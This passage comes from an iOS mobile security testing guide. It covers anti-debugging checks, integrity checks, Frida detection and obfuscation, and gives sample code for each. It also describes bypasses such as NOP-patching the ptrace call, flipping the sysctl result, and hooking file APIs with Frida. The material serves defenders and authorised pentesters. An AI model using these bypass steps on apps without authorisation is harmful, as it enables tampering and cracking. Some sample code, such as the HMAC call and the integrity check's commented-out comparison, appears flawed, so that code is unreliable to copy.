fairly well-known anti-debugging technique, so you may encounter it
often during iOS pentests.

\begin{quote}
Before diving into the details, it is important to know that
\texttt{ptrace} is not part of the public iOS API. Non-public APIs are
prohibited, and the App Store may reject apps that include them. Because
of this, \texttt{ptrace} is not directly called in the code; it's called
when a \texttt{ptrace} function pointer is obtained via \texttt{dlsym}.
\end{quote}

The following is an example implementation of the above logic:

\begin{verbatim}
#import <dlfcn.h>
#import <sys/types.h>
#import <stdio.h>
typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);
void anti_debug() {
  ptrace_ptr_t ptrace_ptr = (ptrace_ptr_t)dlsym(RTLD_SELF, "ptrace");
  ptrace_ptr(31, 0, 0, 0); // PTRACE_DENY_ATTACH = 31
}
\end{verbatim}

To demonstrate how to bypass this technique we'll use an example of a
disassembled binary that implements this approach:

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/7e0b90280358800d0d8dd506c16a9aa7131f24db.png}
\caption{Images/Chapters/0x06j/ptraceDisassembly.png}
\end{figure}

Let's break down what's happening in the binary. \texttt{dlsym} is
called with \texttt{ptrace} as the second argument (register R1). The
return value in register R0 is moved to register R6 at offset 0x1908A.
At offset 0x19098, the pointer value in register R6 is called using the
BLX R6 instruction. To disable the \texttt{ptrace} call, we need to
replace the instruction \texttt{BLX\ R6} (\texttt{0xB0\ 0x47} in Little
Endian) with the \texttt{NOP} (\texttt{0x00\ 0xBF} in Little Endian)
instruction. After patching, the code will be similar to the following:

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/ce91965ea5c01a401c81870af5e87e03516b28d1.png}
\caption{Images/Chapters/0x06j/ptracePatched.png}
\end{figure}

\href{http://armconverter.com/}{Armconverter.com} is a handy tool for
conversion between byte-code and instruction mnemonics.

Bypasses for other ptrace-based anti-debugging techniques can be found
in
\href{https://alexomara.com/blog/defeating-anti-debug-techniques-macos-ptrace-variants/}{``Defeating
Anti-Debug Techniques: macOS ptrace variants'' by Alexander O'Mara}.

\hypertarget{using-sysctl}{%
\subparagraph{Using sysctl}\label{using-sysctl}}

Another approach to detecting a debugger that's attached to the calling
process involves \texttt{sysctl}. According to the Apple documentation,
it allows processes to set system information (if having the appropriate
privileges) or simply to retrieve system information (such as whether or
not the process is being debugged). However, note that just the fact
that an app uses \texttt{sysctl} might be an indicator of anti-debugging
controls, though this
\href{http://www.cocoawithlove.com/blog/2016/03/08/swift-wrapper-for-sysctl.html}{won't
be always be the case}.

The following example from the
\href{https://developer.apple.com/library/content/qa/qa1361/_index.html}{Apple
Documentation Archive} checks the \texttt{info.kp\_proc.p\_flag} flag
returned by the call to \texttt{sysctl} with the appropriate parameters:

\begin{Shaded}
\begin{Highlighting}[]
\PreprocessorTok{\#include }\ImportTok{<assert.h>}
\PreprocessorTok{\#include }\ImportTok{<stdbool.h>}
\PreprocessorTok{\#include }\ImportTok{<sys/types.h>}
\PreprocessorTok{\#include }\ImportTok{<unistd.h>}
\PreprocessorTok{\#include }\ImportTok{<sys/sysctl.h>}

\DataTypeTok{static} \DataTypeTok{bool}\NormalTok{ AmIBeingDebugged(}\DataTypeTok{void}\NormalTok{)}
    \CommentTok{// Returns true if the current process is being debugged (either}
    \CommentTok{// running under the debugger or has a debugger attached post facto).}
\NormalTok{\{}
    \DataTypeTok{int}\NormalTok{                 junk;}
    \DataTypeTok{int}\NormalTok{                 mib[}\DecValTok{4}\NormalTok{];}
    \KeywordTok{struct}\NormalTok{ kinfo\_proc   info;}
    \DataTypeTok{size\_t}\NormalTok{              size;}

    \CommentTok{// Initialize the flags so that, if sysctl fails for some bizarre}
    \CommentTok{// reason, we get a predictable result.}

\NormalTok{    info.kp\_proc.p\_flag = }\DecValTok{0}\NormalTok{;}

    \CommentTok{// Initialize mib, which tells sysctl the info we want, in this case}
    \CommentTok{// we\textquotesingle{}re looking for information about a specific process ID.}

\NormalTok{    mib[}\DecValTok{0}\NormalTok{] = CTL\_KERN;}
\NormalTok{    mib[}\DecValTok{1}\NormalTok{] = KERN\_PROC;}
\NormalTok{    mib[}\DecValTok{2}\NormalTok{] = KERN\_PROC\_PID;}
\NormalTok{    mib[}\DecValTok{3}\NormalTok{] = getpid();}

    \CommentTok{// Call sysctl.}

\NormalTok{    size = }\KeywordTok{sizeof}\NormalTok{(info);}
\NormalTok{    junk = sysctl(mib, }\KeywordTok{sizeof}\NormalTok{(mib) / }\KeywordTok{sizeof}\NormalTok{(*mib), \&info, \&size, NULL, }\DecValTok{0}\NormalTok{);}
\NormalTok{    assert(junk == }\DecValTok{0}\NormalTok{);}

    \CommentTok{// We\textquotesingle{}re being debugged if the P\_TRACED flag is set.}

    \ControlFlowTok{return}\NormalTok{ ( (info.kp\_proc.p\_flag \& P\_TRACED) != }\DecValTok{0}\NormalTok{ );}
\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

One way to bypass this check is by patching the binary. When the code
above is compiled, the disassembled version of the second half of the
code is similar to the following:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/14eb01600e94692001b0400a81a0fe1cf64da602.png}
\caption{Images/Chapters/0x06j/sysctlOriginal.png}
\end{figure}

After the instruction at offset 0xC13C, \texttt{MOVNE\ R0,\ \#1} is
patched and changed to \texttt{MOVNE\ R0,\ \#0} (0x00 0x20 in in
byte-code), the patched code is similar to the following:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/cc3959523dec4d1ba423fc34e7a72ba96a9fa1fb.png}
\caption{Images/Chapters/0x06j/sysctlPatched.png}
\end{figure}

You can also bypass a \texttt{sysctl} check by using the debugger itself
and setting a breakpoint at the call to \texttt{sysctl}. This approach
is demonstrated in
\href{https://www.coredump.gr/articles/ios-anti-debugging-protections-part-2/}{iOS
Anti-Debugging Protections \#2}.

\hypertarget{using-getppid}{%
\paragraph{Using getppid}\label{using-getppid}}

Applications on iOS can detect if they have been started by a debugger
by checking their parent PID. Normally, an application is started by the
\href{http://newosxbook.com/articles/Ch07.pdf}{launchd} process, which
is the first process running in the \emph{user mode} and has PID=1.
However, if a debugger starts an application, we can observe that
\texttt{getppid} returns a PID different than 1. This detection
technique can be implemented in native code (via syscalls), using
Objective-C or Swift as shown here:

\begin{verbatim}
func AmIBeingDebugged() -> Bool {
    return getppid() != 1
}
\end{verbatim}

Similarly to the other techniques, this has also a trivial bypass
(e.g.~by patching the binary or by using Frida hooks).

\hypertarget{file-integrity-checks-mstg-resilience-3-and-mstg-resilience-11}{%
\subsubsection{File Integrity Checks (MSTG-RESILIENCE-3 and
MSTG-RESILIENCE-11)}\label{file-integrity-checks-mstg-resilience-3-and-mstg-resilience-11}}

\hypertarget{overview-78}{%
\paragraph{Overview}\label{overview-78}}

There are two topics related to file integrity:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \emph{Application source code integrity checks:} In the ``Tampering
  and Reverse Engineering'' chapter, we discussed the iOS IPA
  application signature check. We also saw that determined reverse
  engineers can bypass this check by re-packaging and re-signing an app
  using a developer or enterprise certificate. One way to make this
  harder is to add a custom check that determines whether the signatures
  still match at runtime.
\item
  \emph{File storage integrity checks:} When files are stored by the
  application, key-value pairs in the Keychain,
  \texttt{UserDefaults}/\texttt{NSUserDefaults}, a SQLite database, or a
  Realm database, their integrity should be protected.
\end{enumerate}

\hypertarget{sample-implementation---application-source-code-1}{%
\subparagraph{Sample Implementation - Application Source
Code}\label{sample-implementation---application-source-code-1}}

Apple takes care of integrity checks with DRM. However, additional
controls (such as in the example below) are possible. The
\texttt{mach\_header} is parsed to calculate the start of the
instruction data, which is used to generate the signature. Next, the
signature is compared to the given signature. Make sure that the
generated signature is stored or coded somewhere else.

\begin{Shaded}
\begin{Highlighting}[]
\DataTypeTok{int}\NormalTok{ xyz(}\DataTypeTok{char}\NormalTok{ *dst) \{}
    \DataTypeTok{const} \KeywordTok{struct}\NormalTok{ mach\_header * header;}
\NormalTok{    Dl\_info dlinfo;}

    \ControlFlowTok{if}\NormalTok{ (dladdr(xyz, \&dlinfo) == }\DecValTok{0}\NormalTok{ || dlinfo.dli\_fbase == NULL) \{}
\NormalTok{        NSLog(@}\StringTok{" Error: Could not resolve symbol xyz"}\NormalTok{);}
\NormalTok{        [NSThread exit];}
\NormalTok{    \}}

    \ControlFlowTok{while}\NormalTok{(}\DecValTok{1}\NormalTok{) \{}

\NormalTok{        header = dlinfo.dli\_fbase;  }\CommentTok{// Pointer on the Mach{-}O header}
        \KeywordTok{struct}\NormalTok{ load\_command * cmd = (}\KeywordTok{struct}\NormalTok{ load\_command *)(header + }\DecValTok{1}\NormalTok{); }\CommentTok{// First load command}
        \CommentTok{// Now iterate through load command}
        \CommentTok{//to find \_\_text section of \_\_TEXT segment}
        \ControlFlowTok{for}\NormalTok{ (}\DataTypeTok{uint32\_t}\NormalTok{ i = }\DecValTok{0}\NormalTok{; cmd != NULL \&\& i < header{-}>ncmds; i++) \{}
            \ControlFlowTok{if}\NormalTok{ (cmd{-}>cmd == LC\_SEGMENT) \{}
                \CommentTok{// \_\_TEXT load command is a LC\_SEGMENT load command}
                \KeywordTok{struct}\NormalTok{ segment\_command * segment = (}\KeywordTok{struct}\NormalTok{ segment\_command *)cmd;}
                \ControlFlowTok{if}\NormalTok{ (!strcmp(segment{-}>segname, }\StringTok{"\_\_TEXT"}\NormalTok{)) \{}
                    \CommentTok{// Stop on \_\_TEXT segment load command and go through sections}
                    \CommentTok{// to find \_\_text section}
                    \KeywordTok{struct}\NormalTok{ section * section = (}\KeywordTok{struct}\NormalTok{ section *)(segment + }\DecValTok{1}\NormalTok{);}
                    \ControlFlowTok{for}\NormalTok{ (}\DataTypeTok{uint32\_t}\NormalTok{ j = }\DecValTok{0}\NormalTok{; section != NULL \&\& j < segment{-}>nsects; j++) \{}
                        \ControlFlowTok{if}\NormalTok{ (!strcmp(section{-}>sectname, }\StringTok{"\_\_text"}\NormalTok{))}
                            \ControlFlowTok{break}\NormalTok{; }\CommentTok{//Stop on \_\_text section load command}
\NormalTok{                        section = (}\KeywordTok{struct}\NormalTok{ section *)(section + }\DecValTok{1}\NormalTok{);}
\NormalTok{                    \}}
                    \CommentTok{// Get here the \_\_text section address, the \_\_text section size}
                    \CommentTok{// and the virtual memory address so we can calculate}
                    \CommentTok{// a pointer on the \_\_text section}
                    \DataTypeTok{uint32\_t}\NormalTok{ * textSectionAddr = (}\DataTypeTok{uint32\_t}\NormalTok{ *)section{-}>addr;}
                    \DataTypeTok{uint32\_t}\NormalTok{ textSectionSize = section{-}>size;}
                    \DataTypeTok{uint32\_t}\NormalTok{ * vmaddr = segment{-}>vmaddr;}
                    \DataTypeTok{char}\NormalTok{ * textSectionPtr = (}\DataTypeTok{char}\NormalTok{ *)((}\DataTypeTok{int}\NormalTok{)header + (}\DataTypeTok{int}\NormalTok{)textSectionAddr {-} (}\DataTypeTok{int}\NormalTok{)vmaddr);}
                    \CommentTok{// Calculate the signature of the data,}
                    \CommentTok{// store the result in a string}
                    \CommentTok{// and compare to the original one}
                    \DataTypeTok{unsigned} \DataTypeTok{char}\NormalTok{ digest[CC\_MD5\_DIGEST\_LENGTH];}
\NormalTok{                    CC\_MD5(textSectionPtr, textSectionSize, digest);     }\CommentTok{// calculate the signature}
                    \ControlFlowTok{for}\NormalTok{ (}\DataTypeTok{int}\NormalTok{ i = }\DecValTok{0}\NormalTok{; i < }\KeywordTok{sizeof}\NormalTok{(digest); i++)             }\CommentTok{// fill signature}
\NormalTok{                        sprintf(dst + (}\DecValTok{2}\NormalTok{ * i), }\StringTok{"\%02x"}\NormalTok{, digest[i]);}

                    \CommentTok{// return strcmp(originalSignature, signature) == 0;    // verify signatures match}

                    \ControlFlowTok{return} \DecValTok{0}\NormalTok{;}
\NormalTok{                \}}
\NormalTok{            \}}
\NormalTok{            cmd = (}\KeywordTok{struct}\NormalTok{ load\_command *)((}\DataTypeTok{uint8\_t}\NormalTok{ *)cmd + cmd{-}>cmdsize);}
\NormalTok{        \}}
\NormalTok{    \}}

\NormalTok{\}}
\end{Highlighting}
\end{Shaded}

\hypertarget{sample-implementation---storage-1}{%
\subparagraph{Sample Implementation -
Storage}\label{sample-implementation---storage-1}}

When ensuring the integrity of the application storage itself, you can
create an HMAC or signature over either a given key-value pair or a file
stored on the device. The CommonCrypto implementation is best for
creating an HMAC. If you need encryption, make sure that you encrypt and
then HMAC as described in
\href{https://cseweb.ucsd.edu/~mihir/papers/oem.html}{Authenticated
Encryption}.

When you generate an HMAC with CC:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Get the data as \texttt{NSMutableData}.
\item
  Get the data key (from the Keychain if possible).
\item
  Calculate the hash value.
\item
  Append the hash value to the actual data.
\item
  Store the results of step 4.
\end{enumerate}

\begin{verbatim}
    // Allocate a buffer to hold the digest and perform the digest.
    NSMutableData* actualData = [getData];
    //get the key from the keychain
    NSData* key = [getKey];
    NSMutableData* digestBuffer = [NSMutableData dataWithLength:CC_SHA256_DIGEST_LENGTH];
    CCHmac(kCCHmacAlgSHA256, [actualData bytes], (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [digestBuffer mutableBytes]);
    [actualData appendData: digestBuffer];
\end{verbatim}

Alternatively, you can use NSData for steps 1 and 3, but you'll need to
create a new buffer for step 4.

When verifying the HMAC with CC, follow these steps:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Extract the message and the hmacbytes as separate \texttt{NSData}.
\item
  Repeat steps 1-3 of the procedure for generating an HMAC on the
  \texttt{NSData}.
\item
  Compare the extracted HMAC bytes to the result of step 1.
\end{enumerate}

\begin{verbatim}
  NSData* hmac = [data subdataWithRange:NSMakeRange(data.length - CC_SHA256_DIGEST_LENGTH, CC_SHA256_DIGEST_LENGTH)];
  NSData* actualData = [data subdataWithRange:NSMakeRange(0, (data.length - hmac.length))];
  NSMutableData* digestBuffer = [NSMutableData dataWithLength:CC_SHA256_DIGEST_LENGTH];
  CCHmac(kCCHmacAlgSHA256, [actualData bytes], (CC_LONG)[key length], [actualData bytes], (CC_LONG)[actualData length], [digestBuffer mutableBytes]);
  return [hmac isEqual: digestBuffer];
\end{verbatim}

\hypertarget{bypassing-file-integrity-checks-1}{%
\subparagraph{Bypassing File Integrity
Checks}\label{bypassing-file-integrity-checks-1}}

When you're trying to bypass the application-source integrity checks

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Patch the anti-debugging functionality and disable the unwanted
  behavior by overwriting the associated code with NOP instructions.
\item
  Patch any stored hash that's used to evaluate the integrity of the
  code.
\item
  Use Frida to hook file system APIs and return a handle to the original
  file instead of the modified file.
\end{enumerate}

When you're trying to bypass the storage integrity checks

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Retrieve the data from the device, as described in the
  ``\protect\hyperlink{device-binding-mstg-resilience-10}{Device
  Binding}'' section.
\item
  Alter the retrieved data and return it to storage.
\end{enumerate}

\hypertarget{effectiveness-assessment-7}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-7}}

\emph{For the application source code integrity checks} Run the app on
the device in an unmodified state and make sure that everything works.
Then apply patches to the executable using optool, re-sign the app as
described in the chapter ``Basic Security Testing'', and run it. The app
should detect the modification and respond in some way. At the very
least, the app should alert the user and/or terminate the app. Work on
bypassing the defenses and answer the following questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be bypassed trivially (e.g., by hooking a single
  API function)?
\item
  How difficult is identifying the anti-debugging code via static and
  dynamic analysis?
\item
  Did you need to write custom code to disable the defenses? How much
  time did you need?
\item
  What is your assessment of the difficulty of bypassing the mechanisms?
\end{itemize}

\emph{For the storage integrity checks} A similar approach works. Answer
the following questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be bypassed trivially (e.g., by changing the
  contents of a file or a key-value pair)?
\item
  How difficult is obtaining the HMAC key or the asymmetric private key?
\item
  Did you need to write custom code to disable the defenses? How much
  time did you need?
\item
  What is your assessment of the difficulty of bypassing the
  mechanisms??
\end{itemize}

\hypertarget{testing-reverse-engineering-tools-detection-mstg-resilience-4-1}{%
\subsubsection{Testing Reverse Engineering Tools Detection
(MSTG-RESILIENCE-4)}\label{testing-reverse-engineering-tools-detection-mstg-resilience-4-1}}

\hypertarget{overview-79}{%
\paragraph{Overview}\label{overview-79}}

The presence of tools, frameworks and apps commonly used by reverse
engineers may indicate an attempt to reverse engineer the app. Some of
these tools can only run on a jailbroken device, while others force the
app into debugging mode or depend on starting a background service on
the mobile phone. Therefore, there are different ways that an app may
implement to detect a reverse engineering attack and react to it,
e.g.~by terminating itself.

\hypertarget{detection-methods-1}{%
\paragraph{Detection Methods}\label{detection-methods-1}}

You can detect popular reverse engineering tools that have been
installed in an unmodified form by looking for associated application
packages, files, processes, or other tool-specific modifications and
artifacts. In the following examples, we'll discuss different ways to
detect the Frida instrumentation framework, which is used extensively in
this guide and also in the real world. Other tools, such as Cydia
Substrate or Cycript, can be detected similarly. Note that injection,
hooking and DBI (Dynamic Binary Instrumentation) tools can often be
detected implicitly, through runtime integrity checks, which are
discussed below.

For instance, Frida runs under the name of frida-server in its default
configuration (injected mode) on a jailbroken device. When you
explicitly attach to a target app (e.g.~via frida-trace or the Frida
CLI), Frida injects a frida-agent into the memory of the app. Therefore,
you may expect to find it there after attaching to the app (and not
before). On Android, verifying this is pretty straightforward as you can
simply grep for the string ``frida'' in the memory maps of the process
ID in the \texttt{proc} directory
(\texttt{/proc/\textless{}pid\textgreater{}/maps}). However, on iOS the
\texttt{proc} directory is not available, but you can list the loaded
dynamic libraries in an app with the function
\texttt{\_dyld\_image\_count}.

Frida may also run in the so-called embedded mode, which also works for
non-jailbroken devices. It consists of embedding a
\href{https://www.frida.re/docs/gadget/}{frida-gadget} into the IPA and
\emph{forcing} the app to load it as one of its native libraries.

The application's static content, including its ARM-compiled binary and
its external libraries, is stored inside the
\texttt{\textless{}Application\textgreater{}.app} directory. If you
inspect the content of the
\texttt{/var/containers/Bundle/Application/\textless{}UUID\textgreater{}/\textless{}Application\textgreater{}.app}
directory, you'll find the embedded frida-gadget as FridaGadget.dylib.

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{iPhone}\NormalTok{:/var/containers/Bundle/Application/AC5DC1FD{-}3420{-}42F3{-}8CB5{-}E9D77C4B287A/SwiftSecurity.app/Frameworks root\# ls {-}alh}
\ExtensionTok{total}\NormalTok{ 87M}
\ExtensionTok{drwxr{-}xr{-}x}\NormalTok{ 10 \_installd \_installd  320 Nov 19 06:08 ./}
\ExtensionTok{drwxr{-}xr{-}x}\NormalTok{ 11 \_installd \_installd  352 Nov 19 06:08 ../}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd  70M Nov 16 06:37 FridaGadget.dylib}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd 3.8M Nov 16 06:37 libswiftCore.dylib}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd  71K Nov 16 06:37 libswiftCoreFoundation.dylib}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd 136K Nov 16 06:38 libswiftCoreGraphics.dylib}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd  99K Nov 16 06:37 libswiftDarwin.dylib}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd 189K Nov 16 06:37 libswiftDispatch.dylib}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd 1.9M Nov 16 06:38 libswiftFoundation.dylib}
\ExtensionTok{{-}rw{-}r{-}{-}r{-}{-}}\NormalTok{  1 \_installd \_installd  76K Nov 16 06:37 libswiftObjectiveC.dylib}
\end{Highlighting}
\end{Shaded}

Looking at these \emph{traces} that Frida \emph{leaves behind}, you
might already imagine that detecting Frida would be a trivial task. And
while it is trivial to detect these libraries, it is equally trivial to
bypass such a detection. Detection of tools is a cat and mouse game and
things can get much more complicated. The following table shortly
presents a set of some typical Frida detection methods and a short
discussion on their effectiveness.

\begin{quote}
Some of the following detection methods are implemented in the
\href{https://github.com/securing/IOSSecuritySuite}{iOS Security Suite}.
\end{quote}

\begin{longtable}[]{@{}lll@{}}
\toprule
\begin{minipage}[b]{0.30\columnwidth}\raggedright
Method\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Description\strut
\end{minipage} & \begin{minipage}[b]{0.30\columnwidth}\raggedright
Discussion\strut
\end{minipage}\tabularnewline
\midrule
\endhead
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Check The Environment For Related Artifacts}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Artifacts can be packaged files, binaries, libraries, processes, and
temporary files. For Frida, this could be the frida-server running in
the target (jailbroken) system (the daemon responsible for exposing
Frida over TCP) or the frida libraries loaded by the app.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
Inspecting running services is not possible for an iOS app on a
non-jailbroken device. The Swift method
\href{https://developer.apple.com/documentation/swift/commandline}{CommandLine}
is not available on iOS to query for information about running
processes, but there are unofficial ways, such as by using
\href{https://stackoverflow.com/a/56619466}{NSTask}. Nevertheless when
using this method, the app will be rejected during the App Store review
process. There is no other public API available to query for running
processes or execute system commands within an iOS App. Even if it would
be possible, bypassing this would be as easy as just renaming the
corresponding Frida artifact (frida-server/frida-gadget/frida-agent).
Another way to detect Frida, would be to walk through the list of loaded
libraries and check for suspicious ones (e.g.~those including ``frida''
in their names), which can be done by using
\texttt{\_dyld\_get\_image\_name}.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Checking For Open TCP Ports}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
The frida-server process binds to TCP port 27042 by default. Testing
whether this port is open is another method of detecting the
daemon.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
This method detects frida-server in its default mode, but the listening
port can be changed via a command line argument, so bypassing this is
very trivial.\strut
\end{minipage}\tabularnewline
\begin{minipage}[t]{0.30\columnwidth}\raggedright
\textbf{Checking For Ports Responding To D-Bus Auth}\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
\texttt{frida-server} uses the D-Bus protocol to communicate, so you can
expect it to respond to D-Bus AUTH. Send a D-Bus AUTH message to every
open port and check for an answer, hoping that \texttt{frida-server}
will reveal itself.\strut
\end{minipage} & \begin{minipage}[t]{0.30\columnwidth}\raggedright
This is a fairly robust method of detecting \texttt{frida-server}, but
Frida offers alternative modes of operation that don't require
frida-server.\strut
\end{minipage}\tabularnewline
\bottomrule
\end{longtable}

Please remember that this table is far from exhaustive. For example, two
other possible detection mechanisms are:

\begin{itemize}
\tightlist
\item
  \href{https://en.wikipedia.org/wiki/Named_pipe}{named pipes} (used by
  frida-server for external communication), or
\item
  detecting
  \href{https://en.wikipedia.org/wiki/Trampoline_\%28computing\%29}{trampolines}
  (see
  ``\href{https://www.guardsquare.com/en/blog/iOS-SSL-certificate-pinning-bypassing}{Prevent
  bypassing of SSL certificate pinning in iOS applications}'' for
  further explanation and sample code for detection of trampolines in an
  iOS app)
\end{itemize}

Both would \emph{help} to detect Substrate or Frida's Interceptor but,
for example, won't be effective against Frida's Stalker. Remember that
the success of each of these detection methods will depend on whether
you're using a jailbroken device, the specific version of the jailbreak
and method and/or the version of the tool itself. At the end, this is
part of the cat and mouse game of protecting data being processed on an
uncontrolled environment (the end user's device).

\begin{quote}
It is important to note that these controls are only increasing the
complexity of the reverse engineering process. If used, the best
approach is to combine the controls cleverly instead of using them
individually. However, none of them can assure a 100\% effectiveness, as
the reverse engineer will always have full access to the device and will
therefore always win! You also have to consider that integrating some of
the controls into your app might increase the complexity of your app and
even have an impact on its performance.
\end{quote}

\hypertarget{effectiveness-assessment-8}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-8}}

Launch the app with various reverse engineering tools and frameworks
installed on your test device. Include at least the following: Frida,
Cydia Substrate, Cycript, SSL Kill Switch and the Needle Agent.

The app should respond in some way to the presence of those tools. For
example by:

\begin{itemize}
\tightlist
\item
  Alerting the user and asking for accepting liability.
\item
  Preventing execution by gracefully terminating.
\item
  Securely wiping any sensitive data stored on the device.
\item
  Reporting to a backend server, e.g, for fraud detection.
\end{itemize}

Next, work on bypassing the detection of the reverse engineering tools
and answer the following questions:

\begin{itemize}
\tightlist
\item
  Can the mechanisms be bypassed trivially (e.g., by hooking a single
  API function)?
\item
  How difficult is identifying the anti reverse engineering code via
  static and dynamic analysis?
\item
  Did you need to write custom code to disable the defenses? How much
  time did you need?
\item
  What is your assessment of the difficulty of bypassing the mechanisms?
\end{itemize}

The following steps should guide you when bypassing detection of reverse
engineering tools:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Patch the anti reverse engineering functionality. Disable the unwanted
  behavior by patching the binary through usage of radare2/Cutter or
  Ghidra.
\item
  Use Frida or Cydia Substrate to hook file system APIs on the
  Objective-C/Swift or native layers. Return a handle to the original
  file, not the modified file.
\end{enumerate}

Refer to the chapter
\href{0x06c-Reverse-Engineering-and-Tampering.md}{Tampering and Reverse
Engineering on iOS}" for examples of patching and code injection.

\hypertarget{testing-emulator-detection-mstg-resilience-5-1}{%
\subsubsection{Testing Emulator Detection
(MSTG-RESILIENCE-5)}\label{testing-emulator-detection-mstg-resilience-5-1}}

\hypertarget{overview-80}{%
\paragraph{Overview}\label{overview-80}}

The goal of emulator detection is to increase the difficulty of running
the app on an emulated device. This forces the reverse engineer to
defeat the emulator checks or utilize the physical device, thereby
barring the access required for large-scale device analysis.

However, this is not a concern on iOS. As discussed in the section
\href{0x06b-Basic-Security-Testing.md}{Testing on the iOS Simulator} in
the basic security testing chapter, the only available simulator is the
one that ships with Xcode. Simulator binaries are compiled to x86 code
instead of ARM code and apps compiled for a real device (ARM
architecture) don't run in the simulator. This makes the simulator
useless for black box analysis and reverse engineering.

\hypertarget{testing-obfuscation-mstg-resilience-9-1}{%
\subsubsection{Testing Obfuscation
(MSTG-RESILIENCE-9)}\label{testing-obfuscation-mstg-resilience-9-1}}

\hypertarget{overview-81}{%
\paragraph{Overview}\label{overview-81}}

Obfuscation is a process of transforming code into a form that is
difficult to disassemble and understand and is an integral part of every
software protection scheme. The application preserves the original
functionality after obfuscation. What's important to understand is that
obfuscation isn't something that can be simply turned on or off.
Programs can be made incomprehensible, in whole or in part, in many ways
and to different degrees.

\begin{quote}
Note: All presented techniques below may not stop reverse engineers, but
combining all of those techniques will make their job significantly
harder. The aim of those techniques is to discourage reverse engineers
from performing further analysis.
\end{quote}

The following techniques can be used to obfuscate an application:

\begin{itemize}
\tightlist
\item
  Name obfuscation
\item
  Instruction substitution
\item
  Control flow flattening
\item
  Dead code injection
\item
  String encryption
\end{itemize}

\hypertarget{name-obfuscation}{%
\paragraph{Name Obfuscation}\label{name-obfuscation}}

The standard compiler generates binary symbols based on class and
function names from the source code. Therefore, if no obfuscation was
applied, symbol names remain meaningful and can be easily read straight
from the app binary. For instance, a function which detects a jailbreak
can be located by searching for relevant keywords (e.g.~``jailbreak'').
The listing below shows the disassembled function
\texttt{JailbreakDetectionViewController.jailbreakTest4Tapped} from the
Damn Vulnerable iOS App (DVIA-v2).

\begin{verbatim}
__T07DVIA_v232JailbreakDetectionViewControllerC20jailbreakTest4TappedyypF:
stp        x22, x21, [sp, #-0x30]!
mov        rbp, rsp
\end{verbatim}

After the obfuscation we can observe that the symbol's name is no longer
meaningful as shown on the listing below.

\begin{verbatim}
__T07DVIA_v232zNNtWKQptikYUBNBgfFVMjSkvRdhhnbyyFySbyypF:
stp        x22, x21, [sp, #-0x30]!
mov        rbp, rsp
\end{verbatim}

Nevertheless, this only applies to the names of functions, classes and
fields. The actual code remains unmodified, so an attacker can still
read the disassembled version of the function and try to understand its
purpose (e.g.~to retrieve the logic of a security algorithm).

\hypertarget{instruction-substitution}{%
\paragraph{Instruction Substitution}\label{instruction-substitution}}

This technique replaces standard binary operators like addition or
subtraction with more complex representations. For example an addition
\texttt{x\ =\ a\ +\ b} can be represented as
\texttt{x\ =\ -(-a)\ -\ (-b)}. However, using the same replacement
representation could be easily reversed, so it is recommended to add
multiple substitution techniques for a single case and introduce a
random factor. This technique is vulnerable to deobfuscation, but
depending on the complexity and depth of the substitutions, applying it
can still be time consuming.

\hypertarget{control-flow-flattening}{%
\paragraph{Control Flow Flattening}\label{control-flow-flattening}}

Control flow flattening replaces original code with a more complex
representation. The transformation breaks the body of a function into
basic blocks and puts them all inside a single infinite loop with a
switch statement that controls the program flow. This makes the program
flow significantly harder to follow because it removes the natural
conditional constructs that usually make the code easier to read.

\begin{figure}
\centering
\includegraphics{/tmp/tex2pdf.-b81d3c9506d190f0/3f030b8c86c7c6cc516e082a4161b4b92914121b.png}
\caption{control-flow-flattening}
\end{figure}

The image shows how control flow flattening alters code (see
``\href{http://ac.inf.elte.hu/Vol_030_2009/003.pdf}{Obfuscating C++
programs via control flow flattening}'')

\hypertarget{dead-code-injection}{%
\paragraph{Dead Code Injection}\label{dead-code-injection}}

This technique makes the program's control flow more complex by
injecting dead code into the program. Dead code is a stub of code that
doesn't affect the original program's behaviour but increases the
overhead for the reverse engineering process.

\hypertarget{string-encryption}{%
